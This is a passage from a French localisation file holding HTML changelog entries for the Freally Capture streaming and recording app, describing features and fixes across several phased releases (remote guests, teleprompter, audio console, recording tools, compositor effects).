la visibilité de chaque élément ; puis <strong>choisissez une à une</strong> les modifications à intégrer (une scène choisie apporte les sources qu'elle utilise). Réconciliez deux versions sans cloud.","changelog.e1355c54d6d7":"<strong>Instantanés de version nommés (CAP-N62)</strong> — des points de contrôle nommés de la collection active en un clic, avec une chronologie consultable, la restauration et une vue des différences (qui réutilise l'outil de comparaison). Un historique délibéré, à côté de l'enregistrement automatique et de l'annulation ; limité à 50, avec l'espace disque utilisé affiché, et un point de contrôle « avant restauration » pour qu'une restauration ne soit jamais irréversible.","changelog.afc196f3991b":"<strong>Mode portable (CAP-N63)</strong> — déposez un marqueur <code>freally-portable.txt</code> à côté de l'exécutable et toutes les données de l'application (paramètres, profils, collections) résident dans le dossier de l'exe — faites tourner tout le studio depuis une clé USB sans toucher au profil du système hôte. Paramètres → À propos indique l'état du mode portable et l'emplacement des données.","changelog.4072af7dcc85":"<strong>Sauvegarde et restauration en un fichier (CAP-N64)</strong> — exportez tout (paramètres, profils, collections de scènes) dans un seul <code>.fcapbackup</code> versionné, et restaurez-le de façon sélective ici ou sur une nouvelle machine (un parcours de migration). Les secrets — clés de stream, mots de passe — sont toujours retirés d'une sauvegarde ; les champs gérés par le backend (CLUF, prise en main, profils de caméra) sont conservés lors de la restauration.","changelog.6b0e17039cce":"<strong>Éditeur de thèmes (CAP-N65)</strong> — un éditeur visuel du thème en variables CSS : composez la palette complète de six couleurs avec des avertissements de <strong>contraste WCAG</strong> en direct, et exportez/importez des fichiers <code>.fctheme</code> partageables.","changelog.1f2d5f8ca405":"<strong>Préréglages de disposition des docks (CAP-N66)</strong> — enregistrez des dispositions d'affichage nommées (visibilité du dock de statistiques + orientation de la console) et passez de l'une à l'autre.","changelog.a66f42ada61a":"<strong>Recherche dans les paramètres et modifications récentes (CAP-N67)</strong> — un champ de recherche dans la fenêtre Paramètres (chaque catégorie indexée par mots-clés, avec accès direct), plus un marqueur « modifié depuis l'ouverture » par catégorie.","changelog.5331e00f8cd2":"<strong>Grille d'actions rapides (CAP-N68)</strong> — un tableau de boutons personnalisable façon Stream Deck (scènes, commandes, macros, pads du soundboard) avec une couleur par bouton et des pages ; les boutons de commande déclenchent les mêmes actions de studio autorisées que les raccourcis et le panneau LAN, et la configuration de la grille est <strong>partagée avec le panneau LAN CAP-N06</strong>.","changelog.5217d787621c":"<strong>Projecteur du prompteur</strong> — « Ouvrir le projecteur » ouvrait une fenêtre vide impossible à fermer (elle n'avait ni bordure ni barre de titre, et son IPC n'était pas autorisé). Il s'ouvre désormais dans une fenêtre normale, que l'on peut fermer, et qui affiche le script défilant ; <strong>Esc</strong> la ferme. <strong>Fichier → Quitter</strong> ferme aussi l'application de manière fiable (il manquait à la fenêtre principale l'autorisation de fermer une fenêtre).","changelog.a9bceee9f47d":"<strong>Boîte de dialogue du prompteur</strong> — un bouton <strong>Arrêter</strong> (pause + retour au début) : un script court ne paraît plus vide après Lecture, et le texte peut être relu et retouché.","changelog.2e825abc071d":"<strong>Panneau Sources</strong> — les commandes de suppression et de réorganisation de chaque source n'apparaissaient qu'au survol et pouvaient être coupées hors du rail ; chaque source a désormais une <strong>barre de commandes supérieure</strong> toujours visible (EN DIRECT/ENR. · verrou · réorganisation · filtres · propriétés · cloner · supprimer).","changelog.78b6f1cfd693":"<strong>Aucune nouvelle dépendance</strong> (la crate <code>zip</code> était déjà embarquée) et <strong>aucun nouvel appel réseau</strong> : les fonctionnalités de pack, de sauvegarde, d'instantané et de thème reposent strictement sur des fichiers locaux ; le partage des actions rapides en réseau local passe par le panneau web CAP-N06 existant, à activer soi-même. <code>wix.version</code> passe de 0.253.0 à 0.254.0 (plafond de version mineure MSI).","changelog.871a49bf7084":"<span class=\"release__meta\"><span class=\"release__ver\">v0.800.0</span><time class=\"release__date\" datetime=\"2026-07-17\">2026-07-17</time></span><span class=\"release__title\">(Invités à distance et production d'émission — Phase 7)</span>","changelog.72750cf3fb55":"<em>De « les invités se connectent » à « une émission produite ».</em> La phase 7 transforme la session d'invités à distance en studio multi-invités et y ajoute la couche de production en direct : dessiner sur le programme en direct, faire défiler un prompteur, garder les invités dans une salle d'attente avant leur passage à l'antenne, leur envoyer des consignes privées, surveiller la qualité de connexion de chaque invité et répartir tout le monde dans une grille automatique. Le transport des invités à distance accepte désormais <strong>jusqu'à huit invités</strong> (hôte + 8 = une galerie de 1 à 9). Tout passe par la session P2P existante, à activer soi-même — pas de nouveau broker, aucun serveur exploité par Mike, rien qui se connecte automatiquement — et chaque nouvelle surface est désactivée ou sans raccourci par défaut.","changelog.c6ee3e56912f":"<strong>Télestrateur — dessiner sur le programme en direct (CAP-N57)</strong> — annotez le flux sortant avec les outils Stylo, Surligneur, Flèche et Ellipse, composités dans le programme pour que les marques arrivent dans l'enregistrement et dans le stream au moment où vous les tracez (et pas seulement dans votre aperçu). Les marques s'estompent après un délai défini, ou passez en mode tableau blanc pour les conserver jusqu'à ce que vous les effaciez. Sensible à la pression des tablettes ; un raccourci d'effacement (non attribué tant que vous ne l'assignez pas). Comme il est tracé directement par-dessus le programme fini, il atteint chaque sortie — y compris les variantes CAP-N53 réservées au stream ou à l'enregistrement.","changelog.2b2452ceb3fd":"<strong>Prompteur (CAP-N58)</strong> — un script à défilement fluide sur trois surfaces à la fois : un panneau dans l'application, un projecteur plein écran pour le présentateur (avec un mode miroir pour les vitres semi-réfléchissantes) et une vue sur le panneau tactile en réseau local. Scripts en texte brut ou en Markdown léger, vitesse et police réglables. Contrôle du défilement par raccourci, MIDI, OSC ou depuis le panneau LAN — la position de défilement est partagée, si bien que toutes les surfaces restent synchronisées.","changelog.eba68ba03d3d":"<strong>Salle d'attente pour les invités à distance (CAP-N54)</strong> — les nouveaux invités peuvent arriver dans un état d'attente privé : vous voyez leur caméra et une vérification technique caméra/micro dans un moniteur, hors programme, et vous les mettez à l'antenne en un clic. Facultatif (désactivé par défaut) ; l'invité voit un bandeau « vous êtes dans la salle d'attente » à la fois dans l'application de bureau et sur la page web permettant de rejoindre.","changelog.7576d4597bb5":"<strong>Système de consignes et de talkback (CAP-N55)</strong> — envoyez à un invité connecté des consignes textuelles privées (« 30 secondes », « Concluez », « C'est bientôt à vous », « Parlez plus fort ») via le canal de données P2P existant. L'invité voit la consigne avec un compte à rebours en direct sur sa page de connexion ou dans l'application — jamais dans le programme. Aucune nouvelle surface réseau.","changelog.8eed1deed31f":"<strong>Tableau de bord de la qualité de connexion des invités (CAP-N56)</strong> — une synthèse QoS en direct pour chaque invité : temps aller-retour, perte de paquets, résolution et fréquence d'images reçues, et gigue, avec un badge vert/orange/rouge et une mini-courbe d'historique, pour que « votre connexion se dégrade » soit visible avant que les spectateurs ne le remarquent.","changelog.a49bc0c0f6ee":"<strong>Dispositions d'invités en grille automatique (CAP-N59)</strong> — disposez les invités à l'antenne dans une grille automatique de 1 à 9 qui se réorganise quand des invités rejoignent, partent ou sont mis à l'antenne, le nom de chaque place étant publié sous forme de variable <code>{{guestN}}</code>, si bien qu'une source de titre devient une plaque nominative mise à jour automatiquement. Sans chevauchement, par construction.","changelog.5b7dd4b9a43f":"<strong>Sessions à distance multi-invités</strong> — le transport des invités à distance, à activer soi-même, accepte désormais <strong>jusqu'à huit invités</strong> à la fois (un seul auparavant), chacun avec sa propre vignette, ses propres coupures de micro, sa qualité de connexion, son canal de consignes et sa mise à l'antenne en un clic. C'est toujours la même session pair à pair — les médias circulent directement entre l'hôte et les invités, sans serveur, et rien ne se connecte tant que vous n'avez invité personne. Validé dans le budget de performances à quatre invités ; au-delà, tout dépend de la bande passante et du processeur de l'hôte.","changelog.c35af444edf6":"<span class=\"release__meta\"><span class=\"release__ver\">v0.700.0</span><time class=\"release__date\" datetime=\"2026-07-17\">2026-07-17</time></span><span class=\"release__title\">(Fiabilité et compréhension de la diffusion — Phase 6)</span>","changelog.82098fd2d64d":"<em>Répéter, mesurer, expliquer.</em> La phase 6 vise à savoir que votre émission tiendra avant de passer en direct, et à comprendre ce qui s'est passé ensuite. Vous pouvez désormais faire tourner toute la chaîne vers une destination locale privée avec un mauvais réseau simulé, mesurer ce que votre machine peut réellement tenir, consulter une chronologie enregistrée de chaque événement de rendu, d'encodage et de reconnexion, et obtenir un rapport écrit à la fin du stream — et aussi marquer n'importe quelle source comme réservée au stream ou à l'enregistrement. Tout est désactivé ou neutre par défaut, et rien ici n'ajoute d'appel réseau : la répétition à blanc et le banc d'essai sont entièrement locaux, et le simulateur réseau ne dégrade jamais que les destinations en boucle locale de la répétition — jamais une vraie diffusion.","changelog.be9efbd98807":"<strong>Simulateur de conditions réseau (CAP-N48)</strong> — un modeleur de réseau réservé aux répétitions : plafonds de bande passante déterministes par seau à jetons, latence et gigue ajoutées, et coupures programmées, appliqués aux destinations de répétition pour que vous puissiez éprouver le comportement de reconnexion, l'isolation des voies du multistream et vos choix de débit sur une liaison montante faible et instable avant le jour J. Des préréglages « Wi-Fi d'hôtel » et « Partage de connexion », plus un profil entièrement personnalisé. Déterministe (le même exercice à chaque fois) et, par construction, incapable de toucher à un vrai passage en direct.","changelog.37e19bbed36e":"<strong>Mode répétition / « Passer en direct (répétition) » (CAP-N49)</strong> — faites tourner toute la chaîne du direct — compositeur, encodeur, multiplexeur et la vraie logique de reconnexion — vers une destination en boucle locale propre à l'application, avec le vrai dock de statistiques, l'interface de l'état En direct et les alarmes, pour que toute l'émission soit répétée <strong>sans qu'un seul octet quitte la machine</strong>. Un bouton Répéter violet distinct, un badge RÉPÉTITION sur chaque surface du direct et un bandeau d'état rendent impossible toute confusion entre une répétition et une vraie diffusion ; les clés de stream ne sont même jamais lues, si bien qu'une répétition d'avant-émission fonctionne avant même que les clés existent.","changelog.85d495ae89bc":"<strong>Chronologie d'analyse des images perdues (CAP-N50)</strong> — une chronologie enregistrée sur toute la session qui met en corrélation le temps de rendu, la profondeur de la file de l'encodeur, le débit et les pertes par destination, les reconnexions, les changements de scène, les marqueurs et les alarmes sur un seul graphique zoomable — la réponse, après coup, à « que s'est-il passé à la 43e minute ? ». Le dock de statistiques montre l'<em>instant présent</em> ; cette chronologie enregistre et explique toute la session, échantillonnée hors de la boucle de rendu pour que le chemin de composition à 60 fps n'ait aucun travail supplémentaire.","changelog.bb50bfcb281c":"<strong>Rapport de session de stream (CAP-N51)</strong> — à la fin de la session, un rapport local facultatif en HTML + Markdown écrit à côté de l'enregistrement : durée de diffusion, débit moyen et maximal par destination, pourcentage d'interruption, journal des reconnexions, marqueurs, alarmes et chemins des enregistrements. Uniquement local, partageable par vous seul ; désactivé par défaut.","changelog.fbfd2e9fc49b":"<strong>Assistant de banc d'essai des encodeurs (CAP-N52)</strong> — un banc d'essai guidé, entièrement hors ligne, qui <em>exécute</em> réellement de courtes séries d'encodage (chaque encodeur détecté × préréglage × résolution × fps) sur votre machine, mesure les fps atteints et la marge disponible, et recommande des réglages de canevas, d'encodeur et de débit à partir de ces mesures — applicables en un clic. Les échecs sont listés, jamais cachés : un encodeur que votre machine propose mais ne peut pas tenir est documenté plutôt qu'écarté en silence. Distinct de l'assistant du premier lancement, qui ne fait que sonder les capacités et appliquer des heuristiques ; celui-ci mesure. Refusé pendant un direct ou un enregistrement, pour ne jamais accaparer l'encodeur en pleine émission.","changelog.7893b3df0384":"<strong>Visibilité des sources par sortie (CAP-N53)</strong> — marquez n'importe quel élément de scène comme visible dans le stream mais pas dans l'enregistrement, ou l'inverse, au sein d'un même canevas — gardez les alertes et le chat dans le flux en direct tandis que l'enregistrement destiné à la VOD reste propre. Survolez une ligne de source pour faire apparaître les bascules <strong>En direct</strong> / <strong>Enr.</strong> ; l'œil principal continue de tout gouverner, et l'aperçu de l'opérateur, les projecteurs et la multivue montrent toujours le programme complet.","changelog.fd1925b97ec5":"<strong>Effets de texte en boucle et publicitaires (Text FX)</strong> — trois nouveaux filtres d'élément conçus pour les boucles promotionnelles ou publicitaires sans surveillance : un filtre <strong>Perspective</strong> qui incline n'importe quelle source (texte, caméras, captures) en l'éloignant du spectateur comme un plan, avec un fondu facultatif du bord lointain — enchaînez-le après le filtre <strong>Défilement</strong> infini existant pour un générique d'ouverture complet à la « Star Wars » — et un filtre <strong>Boucle de fondu</strong> qui fait apparaître un élément en fondu, le maintient, le fait disparaître en fondu puis le garde masqué, selon un cycle répété. Tout est piloté par le temps : une publicité tourne toute seule.","changelog.f557861d47ae":"<span class=\"release__meta\"><span class=\"release__ver\">v0.600.0</span><time class=\"release__date\" datetime=\"2026-07-16\">2026-07-16</time></span><span class=\"release__title\">(Enregistrement et replay en profondeur — Phase 5)</span>","changelog.baab6b442a79":"<em>Tout ce qui entoure le fichier.</em> La phase 5 développe ce qui arrive à un enregistrement avant, pendant et après son écriture sur le disque : des fichiers isolés par source, un découpeur de clips, une vraie transparence, un découpage et des marqueurs de chapitre déclenchés par des événements, une chaîne de tâches après l'enregistrement, un vérificateur d'intégrité et le timecode SMPTE LTC. Chaque nouvelle capacité est désactivée ou neutre par défaut — un enregistrement qui n'utilise rien de tout cela est identique au bit près à ce qu'il était — et rien ici n'ajoute d'appel réseau.","changelog.56eaf8f0fe4b":"<strong>Enregistrement ISO par source (CAP-N40)</strong> — enregistrez des sources choisies, propres, dans leurs propres fichiers à côté du programme, avant composition (avec ou sans les filtres de la source), à la taille et à la fréquence d'images du canevas, pour que chaque ISO se pose sur une timeline de montage alignée sur le programme. Chaque invité à distance n'étant qu'une source, les ISO par invité viennent sans effort. Conteneur et encodeur propres à chaque voie ; l'audio est prélevé après les filtres mais avant le fader et la coupure (une décision de mixage ne rend jamais un fichier ISO muet) ; le bouton panique retient aussi les voies ISO. Désactivé tant qu'aucune source n'est choisie ; des indications honnêtes sur le coût de chaque voie sont données d'emblée.","changelog.070729b0bdcf":"<strong>Découpeur de replays et de clips (CAP-N41)</strong> — une fenêtre de découpe légère pour tout enregistrement sauvegardé dans un format standard : points d'entrée et de sortie à l'image près avec aperçu en direct, et un badge d'export honnête qui indique d'emblée si le clip sera <strong>copié sans réencodage</strong> (un point d'entrée aligné sur une image clé — quasi instantané, sans perte) ou réencodé. Un clic le recadre en master vertical 9:16 grâce à la géométrie du canevas vertical.","changelog.a785df0dd1f8":"<strong>Enregistrement avec couche alpha (CAP-N42)</strong> — enregistrez le programme avec une vraie transparence dans le format propre <code>.frec</code> (un nouvel indicateur d'en-tête ; la version du format est inchangée, si bien que les fichiers avec alpha restent lisibles partout et que les anciens fichiers sont relus opaques). L'enregistreur dispose de son propre rendu sur fond transparent, si bien que l'aperçu et le stream conservent le programme opaque habituel. Exportez vers un master <code>.mov</code> <strong>ProRes 4444</strong> ou <strong>QuickTime Animation (QTRLE)</strong> pour les logiciels de montage via le composant ffmpeg dédié.","changelog.79e72558f2ad":"<strong>Découpage sur changement de scène ou marqueur (CAP-N43)</strong> — de nouveaux déclencheurs pour le découpeur du format propre <code>.frec</code> : commencez un nouveau fichier de partie lors d'un changement de scène, de la pose d'un marqueur de chapitre ou d'une étape du conducteur. Chaque partie commence exactement à la limite d'image de l'événement (durée minimale d'une seconde par partie, pour qu'une rafale d'événements ne produise pas une pluie de fichiers minuscules). Les conteneurs standard ne se découpent que selon la durée, ce que les Paramètres indiquent clairement.","changelog.ef021f62a151":"<strong>Marqueurs automatiques à partir d'événements (CAP-N44)</strong> — des marqueurs de chapitre posés automatiquement par les événements du studio — changements de scène, sauvegardes de replay, reconnexions du stream, rafales d'images perdues, déclenchements d'alarmes et actions du moteur de règles — chacun avec une étiquette typée, en plus du raccourci de marqueur manuel existant. Les étiquettes se retrouvent dans les titres de chapitre mkv et dans le fichier annexe <code>.chapters.txt</code>.","changelog.5e520f7a947e":"<strong>Chaîne post-enregistrement (CAP-N45)</strong> — une chaîne de tâches après l'enregistrement, par profil, tirée d'un ensemble d'actions <strong>fermé et isolé</strong> : vérifier → remux vers MP4 → normaliser le niveau sonore → appliquer une règle de nommage → déplacer/copier vers un dossier → afficher dans le gestionnaire de fichiers → notifier les scripts Lua. Elle s'exécute en arrière-plan avec une vue de la file en direct ; la chaîne s'arrête au premier échec. Il n'y a volontairement aucune étape « exécuter une commande ».","changelog.792a44452b11":"<strong>Vérificateur d'intégrité des enregistrements (CAP-N46)</strong> — une passe locale rapide (après finalisation ou à la demande) qui contrôle la structure du conteneur, le bloc de finalisation, la continuité des images vidéo, la continuité des échantillons audio de chaque piste, le décalage d'entrelacement audio/vidéo et la durée par rapport à l'horloge murale de l'enregistreur, et produit un rapport en langage clair : OK / avertissement / échec. Le format propre <code>.frec</code> a droit à l'analyse approfondie ; les fichiers standard, à une analyse honnête de la structure par ffmpeg + des erreurs de décodage.","changelog.42ea336f6972":"<strong>Source et lecteur de timecode LTC (CAP-N47)</strong> — un générateur et un lecteur de timecode linéaire SMPTE 12M propres à l'application (le timecode audio classique, entièrement hors ligne). Générez le LTC sur une piste de la console au choix (enregistrez-le ou envoyez-le vers un équipement externe) ; lisez le LTC entrant depuis n'importe quelle entrée audio pour piloter une ligne de timecode incrustée sur l'incrustation de statistiques système et des marqueurs de chapitre horodatés en LTC. Aller-retour précis à ±1 image près à 24/25/30 fps.","changelog.157723e79681":"<strong>L'intégration des chapitres ne se dégrade plus quand un enregistrement vertical tourne.</strong> La vérification de l'intégration des chapitres mkv ne regarde désormais que le fichier de l'enregistrement principal, si bien qu'un fichier vertical (ou ISO) parallèle ne fait plus basculer un enregistrement mkv à fichier unique vers le fichier annexe.","changelog.8d45b8a98d91":"<span class=\"release__meta\"><span class=\"release__ver\">v0.500.0</span><time class=\"release__date\" datetime=\"2026-07-15\">2026-07-15</time></span><span class=\"release__title\">(Production audio en profondeur — Phase 4)</span>","changelog.b7c13c220405":"<em>Du mixeur à la console.</em> La phase 4 transforme le mixeur livré en console de diffusion : routage vers des sorties physiques et mixages auxiliaires et de retour, une matrice de ducking N×M, un mixeur automatique à partage de gain, la normalisation de la sonie EBU R128 (régulateur en direct + passe après enregistrement), un égaliseur paramétrique avec spectre en direct, un dé-esseur et un filtre anti-rumble, un soundboard, l'enregistrement audio seul (podcast), un mix-minus par invité avec des préréglages de chaîne vocale en un clic, ainsi que la détection et une base propre sous licence MIT pour l'hébergement de plugins CLAP <strong>et VST3</strong>. Tout est du DSP classique maison — pas d'apprentissage automatique, conformément à la charte — et livré désactivé ou neutre par défaut, si bien qu'un mix qui n'utilise rien de tout cela est identique au bit près à ce qu'il était.","changelog.5159ad1b9251":"<strong>Bus auxiliaires et routage vers les sorties physiques (CAP-N30)</strong> — envoyez le mix master ou l'un des six bus de piste vers des périphériques de sortie physiques supplémentaires, chacun avec son trim, depuis une matrice de <strong>Routage</strong> (le bouton Routage de la console audio). Un bus de piste envoyé au casque constitue un mix de retour distinct du monitoring. Par défaut, le comportement reste exactement celui d'aujourd'hui (seul le bus de monitoring atteint un périphérique).","changelog.d41c3c08bea2":"<strong>Matrice de ducking par sidechain (CAP-N31)</strong> — une grille de <strong>Ducking</strong> unique qui indique qui atténue qui : n'importe quelle source peut atténuer n'importe quel ensemble, chaque paire avec sa propre profondeur, son seuil, son attaque et son relâchement. Le moteur empile plusieurs duckers par tranche, si bien qu'une tranche peut être atténuée par plusieurs déclencheurs à la fois.","changelog.b732fddcfca9":"<strong>Mixeur automatique à partage de gain (CAP-N32)</strong> — une bascule <strong>Mixage auto</strong> façon Dugan sur chaque tranche : sur l'ensemble des micros en mixage automatique, le gain total reste à peu près constant et revient à celui qui parle (une loi déterministe où la somme des gains vaut un), idéal pour les plateaux à plusieurs animateurs et les podcasts. Désactivé par défaut.","changelog.ca003a06d04f":"<strong>Normalisation de la sonie EBU R128 (CAP-N34)</strong> — un <strong>régulateur de sonie</strong> en direct oriente le programme vers une cible (−14 / −16 / −23 LUFS) avec un plafond de crête, appliqué au master et à chaque bus de piste pour que les enregistrements et les streams arrivent à un niveau constant ; plus une action <strong>Normaliser</strong> après enregistrement dans la liste des enregistrements (ffmpeg <code>loudnorm</code>). Désactivé par défaut.","changelog.01407091e030":"<strong>Égaliseur paramétrique + vue du spectre (CAP-N35)</strong> — un égaliseur paramétrique à N bandes (cloche / plateau grave / plateau aigu / coupe-bande / passe-haut / passe-bas) avec des <strong>nœuds déplaçables par-dessus un analyseur de spectre en direct</strong> ; la courbe repose sur les mêmes calculs RBJ que ceux qu'exécute le moteur. FFT maison ; l'analyseur ne s'active pour une tranche que lorsque l'éditeur est ouvert.","changelog.42a294780d05":"<strong>Dé-esseur + filtre anti-rumble (CAP-N36)</strong> — un <strong>dé-esseur</strong> à bandes séparées (un détecteur de sifflantes pilote une atténuation dynamique en plateau aigu, à phase correcte, sans apprentissage automatique) et un <strong>filtre anti-rumble</strong> coupe-bas propre du 2e ordre contre les coups sur le bureau et les plosives — tous deux sous forme de filtres audio ordinaires.","changelog.29e99512428d":"<strong>Soundboard (CAP-N37)</strong> — une grille de pads de clips audio locaux avec gain par pad, groupes d'étouffement (un nouveau pad arrête le dernier de son groupe), boucle, raccourci, attribution de piste et atténuation automatique facultative du reste du mix pendant la lecture d'un pad. Les pads sont décodés par le composant ffmpeg dédié et arrivent dans la console comme n'importe quelle source.","changelog.251ef95cea94":"<strong>Enregistrement audio seul (CAP-N38)</strong> — un <strong>mode podcast</strong> qui enregistre du <strong>WAV</strong> par piste via l'enregistreur maison (aucun encodeur vidéo n'est lancé), éventuellement transcodé en <strong>FLAC/Opus</strong> via le composant ffmpeg dédié, avec des marqueurs de silences sautés écrits dans un fichier annexe et les modèles de nom de fichier CAP-M25. Depuis la boîte de dialogue des enregistrements.","changelog.d0ae0d751fe2":"<strong>Mix-minus par invité et préréglages de chaîne vocale (CAP-N39)</strong> — des <strong>préréglages de chaîne vocale</strong> en un clic (diffusion / podcast / chaîne propre gate→compresseur→égaliseur→limiteur) applicables à n'importe quelle tranche, et un retour <strong>mix-minus (N−1)</strong> maison par source (tout le programme sauf cette source), pour qu'un invité à distance n'entende aucun écho.","changelog.d1c450a7bdfb":"<strong>Plugins audio — détection CLAP + VST3 (CAP-N33)</strong> — un panneau <strong>Plugins</strong> qui trouve vos plugins <strong>CLAP et VST3</strong> installés dans les dossiers standard (à activer soi-même, dossiers locaux uniquement, rien n'est téléchargé). Les deux formats sont sous licence MIT, sans aucun coût (0 $) ; l'hébergement en direct exécutera chaque plugin dans un processus isolé des plantages, avec sa propre interface — cette intégration du processus hôte est en cours, et le panneau expose clairement le plan au lieu de simuler une bascule.","changelog.1002a64a6813":"<strong>Visualiseurs de filtres en direct (vitrine des plugins)</strong> — chaque filtre audio devient un instrument visuel quand son éditeur est ouvert : une <strong>courbe de transfert</strong> pour la dynamique (compresseur / limiteur / gate) sur laquelle se déplace le signal en direct, une <strong>courbe de réponse en fréquence</strong> pour les filtres de timbre (égaliseur / dé-esseur / filtre anti-rumble), ou un affichage de niveau pour les autres — chacun à côté de <strong>vumètres d'entrée / de sortie / de réduction de gain</strong> qui bougent avec l'audio, dans le même style d'analyseur sombre et épuré que l'égaliseur paramétrique.","changelog.5fbac10a716a":"<strong>Raccourci sur le bureau à l'installation sous Windows</strong> — le MSI crée désormais un raccourci <strong>Freally Capture</strong> sur le bureau (supprimé à la désinstallation).","changelog.2a6141e43be0":"Modifié","changelog.015b6bb3a57b":"<strong>VST3 est désormais sous licence MIT.</strong> Steinberg a placé le SDK VST 3.8 sous licence MIT le <strong>2025-10-29</strong> ; l'ancienne remarque « VST3 est sous GPLv3 ou propriétaire, donc incompatible » a été corrigée dans <code>vst.rs</code>, <code>claphost.rs</code> et <code>THIRD-PARTY-NOTICES.md</code> — VST3 est désormais une voie de plugins sans aucun coût (0 $), au même titre que CLAP.","changelog.eaa014cf0965":"<span class=\"release__meta\"><span class=\"release__ver\">v0.400.0</span><time class=\"release__date\" datetime=\"2026-07-15\">2026-07-15</time></span><span class=\"release__title\">(Compositeur et effets en profondeur — Phase 3 terminée)</span>","changelog.c2a0fb6beabd":"La seconde moitié de la phase 3 apporte les cinq fonctionnalités de mouvement et d'effets qui avaient été reportées, ce qui achève la phase : une <strong>transition de déplacement (morphing)</strong>, des <strong>règles de transition</strong>, un <strong>studio de shaders</strong> pour les effets WGSL de l'utilisateur, un éditeur de <strong>masque Bézier</strong> et des <strong>stingers à cache de piste</strong> avec atténuation facultative de l'audio du programme. Plus un correctif pour deux liens du menu Aide qui ne faisaient rien.","changelog.9b85d048fa23":"<strong>Transition de déplacement (morphing) (CAP-N20)</strong> — un nouveau type de transition : les éléments présents à la fois dans la scène sortante <em>et</em> dans la scène entrante (même source) s'animent de leur ancienne position/échelle/rotation/rognage vers la nouvelle au lieu d'être coupés ; les éléments présents dans une seule scène apparaissent ou disparaissent en fondu. L'adoucissement en smootherstep fait accélérer le mouvement au départ et le pose en douceur à l'arrivée.","changelog.ccf72b961a2f":"<strong>Règles de transition (CAP-N21)</strong> — une matrice de transitions par paire de scènes (<strong>Outils → Règles de transition…</strong>) : le passage de la scène A à la scène B peut utiliser son propre type et sa propre durée au lieu de ceux par défaut. Plus un <strong>fondu à l'apparition/disparition</strong> par élément (Modifier la transformation… → révélation) : un élément apparaît progressivement lorsqu'il est rendu visible. Toutes les transitions de fondu et de déplacement sont désormais adoucies.","changelog.cd2edf9cde0e":"<strong>Studio de shaders (CAP-N22)</strong> — écrivez un <strong>effet WGSL utilisateur</strong> sous forme de filtre : il est compilé et validé à l'exécution (un shader invalide est ignoré — la source s'affiche sans filtre, jamais de plantage), avec des curseurs générés automatiquement à partir des annotations <code>// @param</code>, l'édition en direct et une galerie intégrée (niveaux de gris, inversion, lignes de balayage, vignettage).","changelog.51dd65cc8ab0":"<strong>Masque Bézier (CAP-N28)</strong> — un filtre de <strong>masque à main levée</strong> : tracez un chemin fermé (faites glisser les poignées, double-cliquez pour ajouter, clic droit pour supprimer), avec des formes prédéfinies, un adoucissement par bord et l'inversion. Exportez n'importe quel chemin en motif de <strong>volet luma</strong> en niveaux de gris pour une transition qui révèle une forme.","changelog.1e693f57a778":"<strong>Stingers à cache de piste (CAP-N29)</strong> — un stinger peut porter sa transparence sous forme de <strong>cache de piste</strong> (remplissage et cache disposés <strong>côte à côte</strong> ou <strong>empilés</strong>), si bien que l'alpha par pixel survit aux codecs qui le suppriment (H.264/HEVC). Possibilité d'<strong>atténuer l'audio du programme</strong> sous le son du stinger pendant sa lecture.","changelog.646680d87464":"<strong>Aide → Visiter le site web et Portail d'aide ne faisaient rien.</strong> Ces liens de menu (et les mêmes liens dans la boîte de dialogue À propos) comptaient sur la webview pour ouvrir <code>target=&quot;_blank&quot;</code>, ce que ce build Tauri ne fait jamais. Ils ouvrent désormais le navigateur du système via l'ouvreur contrôlé de l'application — <strong>Visiter le site web</strong> → la page d'accueil, <strong>Portail d'aide</strong> → la page de documentation.","changelog.e322c5f672ae":"<span class=\"release__meta\"><span class=\"release__ver\">v0.310.0</span><time class=\"release__date\" datetime=\"2026-07-14\">2026-07-14</time></span><span class=\"release__title\">(Compositeur et effets en profondeur — Phase 3, partie 1)</span>","changelog.2d984c4daa81":"La première moitié de la phase 3 (Compositeur et effets en profondeur) : le mouvement et les effets arrivent sur le canevas — de nouveaux styles de flou, une inclinaison 3D, une image figée, le clonage de sources en un clic et des <strong>incrustations de sortie</strong> façon régie de diffusion qui se superposent à chaque scène. Plus les trois correctifs signalés contre 0.301.0 — dont un bug de projecteur qui pouvait bloquer tout le bureau.","changelog.dbef37c22c9b":"<strong>Famille de flous (CAP-N27)</strong> — quatre nouveaux filtres GPU à côté du flou gaussien : <strong>directionnel</strong> (traînée de mouvement selon un angle), <strong>radial</strong> (rotation autour d'un centre), <strong>zoom</strong> (traînée façon travelling compensé) et <strong>pixelliser</strong> (mosaïque). Chacun tient en une seule passe planifiée, avec des tests sur images de référence.","changelog.1647ee3fae6b":"<strong>Transformation 3D / perspective (CAP-N23)</strong> — un élément peut s'incliner en 3D : <strong>Inclinaison X</strong>, <strong>Inclinaison Y</strong> et une intensité de <strong>Perspective</strong> dans la fenêtre Modifier la transformation. Une transformation simple (non inclinée) s'affiche à l'identique au pixel près — la matrice projective n'est utilisée que lorsqu'une inclinaison est appliquée.","changelog.ebaba11b62a2":"<strong>Filtre d'image figée (CAP-N25)</strong> — ajoutez un filtre <strong>Figer</strong> à une source et elle garde sa dernière image ; le programme, l'aperçu, l'enregistrement et le stream se figent ensemble. Désactivez-le pour reprendre.","changelog.e1ac0ba4a7ba":"<strong>Clonage de source (CAP-N26)</strong> — un bouton <strong>Cloner</strong> sur chaque ligne de source (⧉) : un seul flux, plusieurs rendus. La même source peut figurer dans plusieurs scènes ou emplacements, chaque élément avec sa propre transformation et sa propre pile de filtres (le moteur associait déjà les filtres à chaque élément ; il suffit désormais d'un clic).","changelog.d223f64ff4d4":"<strong>Incrustations de sortie (CAP-N24)</strong> — des calques d'incrustation persistants composités sur la <strong>sortie programme</strong>, au-dessus de chaque scène, qui survivent aux changements de scène (un logo de chaîne, un badge EN DIRECT, un bandeau de titre). Un nouveau panneau <strong>Outils → Incrustations de sortie…</strong> les gère : ajout de n'importe quelle source, ordre, opacité, position/taille, activation par calque. Elles s'affichent aussi bien dans l'aperçu que dans l'enregistrement, le stream et la multivue.","changelog.c53ca5aa04c7":"<strong>Nouveautés</strong> ouvre désormais le journal des modifications de la version en cours <strong>dans l'application</strong> (la même vue des notes en lecture seule que celle de l'outil de mise à jour) au lieu d'un onglet de navigateur — hors ligne, et toujours les notes livrées avec la version.","changelog.a41f1b775b16":"<strong>Espace disque dans le dock Statistiques</strong> — une tuile <strong>Disque</strong> en direct affiche l'espace libre sur le disque d'enregistrement, et pendant un enregistrement une tuile <strong>Enr. restant</strong> estime le temps restant avant que le disque soit plein au débit d'écriture actuel (la même estimation honnête, qui tient compte du <code>.frec</code>, que celle de l'avertissement d'espace disque faible). Vous voyez ainsi combien de place il reste pendant que vous enregistrez ou 